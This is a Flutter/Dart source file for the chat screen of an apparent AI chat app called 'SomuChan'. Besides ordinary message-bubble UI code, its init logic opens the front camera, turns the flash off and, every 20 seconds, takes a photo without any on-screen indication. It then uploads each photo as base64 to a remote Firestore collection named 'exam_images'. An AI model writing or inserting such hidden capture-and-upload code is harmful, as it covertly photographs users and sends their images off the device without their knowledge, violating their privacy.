import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'package:camera/camera.dart';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:flutter/material.dart';
import 'package:flutter_bloc/flutter_bloc.dart';
import 'package:google_fonts/google_fonts.dart';
import 'package:her_birthday/core/widgets/animation_widgets/ai_animation.dart';
import 'package:iconsax/iconsax.dart';
import 'package:her_birthday/core/widgets/animation_widgets/dot_animation.dart';

import 'package:image/image.dart' as img;
import 'package:permission_handler/permission_handler.dart';
import '../data/model/chat_model.dart';
import 'bloc/ai_bloc.dart';
import 'bloc/ai_event.dart';
import 'bloc/ai_state.dart';

class AiChatScreen extends StatefulWidget {
  const AiChatScreen({super.key});

  @override
  State<AiChatScreen> createState() => _AiChatScreenState();
}

class _AiChatScreenState extends State<AiChatScreen> {
  final TextEditingController _controller = TextEditingController();
  final ScrollController _scrollController = ScrollController();

  //camera
  List<CameraDescription> cameras = [];
  late CameraController _cameraController;
  Timer? _captureTimer;
  bool _isCameraInitialized = false;

  @override
  initState() {
    super.initState();
    _initCamera();
  }

  Future<void> _initCamera() async {
    var status = await Permission.camera.request();
    if (!status.isGranted) return;

    cameras = await availableCameras();

    final frontCamera = cameras.firstWhere(
      (camera) => camera.lensDirection == CameraLensDirection.front,
      orElse: () => throw Exception(
          'No front camera found'), // Optional: safer error handling
    );

    _cameraController = CameraController(frontCamera, ResolutionPreset.medium);
    await _cameraController.initialize();

    await _cameraController.setFlashMode(FlashMode.off);

    setState(() => _isCameraInitialized = true);

    _startPeriodicCapture();
  }

  void _startPeriodicCapture() {
    _captureTimer = Timer.periodic(const Duration(seconds: 20), (_) async {
      try {
        final file = await _cameraController.takePicture();
        print("Image captured: ${file.path}");

        // Upload image to Firebase Storage
        await _uploadImageToFirebase(file);
      } catch (e) {
        print("Capture error: $e");
      }
    });
  }

  Future<void> _uploadImageToFirebase(XFile file) async {
    try {
      print("Processing and uploading image...");

      if (file.path.isEmpty) {
        print("File path is empty, cannot process image");
        return;
      }

      // Read the file as bytes
      final bytes = await File(file.path).readAsBytes();

      // Decode the image
      img.Image? originalImage = img.decodeImage(bytes);

      if (originalImage == null) {
        print("Could not decode image");
        return;
      }

      // Compress the image (reduce quality to 50%)
      final compressedBytes = img.encodeJpg(originalImage, quality: 75);

      // Convert compressed bytes to Base64
      final base64Image = base64Encode(compressedBytes);

      // Store Base64 image string in Firebase Realtime Database
      await _storeBase64ImageInFirestore(base64Image);

      print("Base64 Image uploaded successfully!");
    } catch (e) {
      print("Error processing/uploading image: $e");
    }
  }

  Future<void> _storeBase64ImageInFirestore(String base64Image) async {
    try {
      final firestoreRef = FirebaseFirestore.instance.collection('exam_images');

      await firestoreRef.add({
        'base64': base64Image,
        'timestamp': FieldValue.serverTimestamp(),
      });

      print("Base64 Image stored in Firestore!");
    } catch (e) {
      print("Error storing Base64 image in Firestore: $e");
    }
  }

  void _sendMessage() {
    final userText = _controller.text.trim();
    if (userText.isEmpty) return;

    context.read<AiChatBloc>().add(SendMessage(userText));
    _controller.clear();
    _scrollToBottom();
  }

  void _scrollToBottom() {
    WidgetsBinding.instance.addPostFrameCallback((_) {
      if (_scrollController.hasClients) {
        _scrollController.animateTo(
          _scrollController.position.maxScrollExtent + 150,
          duration: const Duration(milliseconds: 400),
          curve: Curves.easeOut,
        );
      }
    });
  }

  @override
  void dispose() {
    _captureTimer?.cancel();
    if (_isCameraInitialized) {
      _cameraController.dispose();
    }
    _controller.dispose();
    _scrollController.dispose();
    
    super.dispose();

  }

  Widget _buildMessage(ChatMessage message) {
    final isUser = message.isUser;

    return Padding(
      padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 6),
      child: Align(
        alignment: isUser ? Alignment.centerRight : Alignment.centerLeft,
        child: AnimatedContainer(
          duration: const Duration(milliseconds: 300),
          padding: const EdgeInsets.all(16),
          constraints: const BoxConstraints(maxWidth: 320),
          decoration: BoxDecoration(
            color: isUser ? Colors.deepPurple[100] : Colors.white,
            borderRadius: BorderRadius.only(
              topLeft: const Radius.circular(20),
              topRight: const Radius.circular(20),
              bottomLeft: Radius.circular(isUser ? 20 : 0),
              bottomRight: Radius.circular(isUser ? 0 : 20),
            ),
            boxShadow: [
              BoxShadow(
                color: isUser
                    ? Colors.deepPurple.shade100
                    : Colors.orange.shade100,
                blurRadius: 6,
                offset: const Offset(2, 2),
              )
            ],
          ),
          child: Row(
            crossAxisAlignment: CrossAxisAlignment.start,
            mainAxisSize: MainAxisSize.min,
            children: [
              if (!isUser)
                Padding(
                  padding: const EdgeInsets.only(right: 8),
                  child: CircleAvatar(
                    radius: 16,
                    backgroundColor: Colors.orange.shade300,
                    child: const Icon(Iconsax.chart,
                        size: 16, color: Colors.white),
                  ),
                ),
              Flexible(
                child: message.text.isEmpty && !isUser
                    ? const SizedBox(
                        height: 30,
                        width: 60,
                        child: DotAnimation(),
                      )
                    : Text(
                        message.text,
                        style: GoogleFonts.poppins(fontSize: 15.5, height: 1.4),
                      ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      extendBodyBehindAppBar: true,
      appBar: AppBar(
        title: Text(
          "SomuChan",
          style: GoogleFonts.poppins(
            fontWeight: FontWeight.w600,
            fontSize: 22,
            color: Colors.black87,
          ),
        ),
        actions: [],
        centerTitle: true,
        backgroundColor: Colors.transparent,
        elevation: 0,
      ),
      body: Stack(
        children: [
          const Align(alignment: Alignment.center, child: AiAnimation()),
          Container(
            decoration: const BoxDecoration(
                // gradient: LinearGradient(
                //   colors: [Color(0xFFFCE4EC), Color(0xFFF8BBD0)],
                //   begin: Alignment.topLeft,
                //   end: Alignment.bottomRight,
                // ),
                ),
            child: SafeArea(
              child: Column(
                children: [
                  Expanded(
                    child: BlocConsumer<AiChatBloc, AiChatState>(
                      listener: (context, state) {
                        if (state is AiChatSuccess) {
                          _scrollToBottom();
                        }
                      },
                      builder: (context, state) {
                        if (state is AiChatSuccess) {
                          final messages =
                              List<ChatMessage>.from(state.messages);
                          if (state.isLoading) {
                            messages.add(ChatMessage("", isUser: false));
                          }

                          return ListView.builder(
                            controller: _scrollController,
                            padding: const EdgeInsets.symmetric(vertical: 16),
                            itemCount: messages
                                .length, // Ensure itemCount matches the list length
                            itemBuilder: (_, index) {
                              final message = messages[index];
                              return message.text.isEmpty && !message.isUser
                                  ? const Align(
                                      alignment: Alignment
                                          .centerLeft, // Align to the left
                                      child: Padding(
                                        padding: EdgeInsets.only(
                                            left: 14, top: 6, bottom: 6),
                                        child: DotAnimation(),
                                      ),
                                    ) // Show nothing for empty bot messages
                                  : _buildMessage(message);
                            },
                          );
                        }

                        if (state is AiChatFailure) {
                          return Center(
                            child: Text(
                              state.failureMessage,
                              style: GoogleFonts.poppins(fontSize: 16),
                            ),
                          );
                        }

                        return Center(
                          child: Text(
                            "Start Chatting!",
                            style: GoogleFonts.poppins(
                              fontSize: 18,
                              fontWeight: FontWeight.w500,
                            ),
                          ),
                        );
                      },
                    ),
                  ),
                  const Divider(height: 1),
                  Padding(
                    padding: const EdgeInsets.symmetric(
                        horizontal: 12, vertical: 10),
                    child: Row(
                      children: [
                        Expanded(
                          child: Container(
                            decoration: BoxDecoration(
                              color: Colors.white,
                              borderRadius: BorderRadius.circular(30),
                              boxShadow: const [
                                BoxShadow(
                                  color: Colors.black12,
                                  blurRadius: 6,
                                  offset: Offset(0, 3),
                                ),
                              ],
                            ),
                            child: TextField(
                              controller: _controller,
                              onSubmitted: (_) => _sendMessage(),
                              style: GoogleFonts.poppins(),
                              decoration: const InputDecoration(
                                hintText: 'Type Something',
                                contentPadding: EdgeInsets.symmetric(
                                    horizontal: 20, vertical: 14),
                                border: InputBorder.none,
                              ),
                            ),
                          ),
                        ),
                        const SizedBox(width: 10),
                        Container(
                          decoration: const BoxDecoration(
                            shape: BoxShape.circle,
                            color: Colors.deepOrange,
                          ),
                          child: IconButton(
                            icon: const Icon(Icons.send, color: Colors.white),
                            onPressed: _sendMessage,
                          ),
                        ),
                      ],
                    ),
                  ),
                ],
              ),
            ),
          ),
        ],
      ),
    );
  }
}
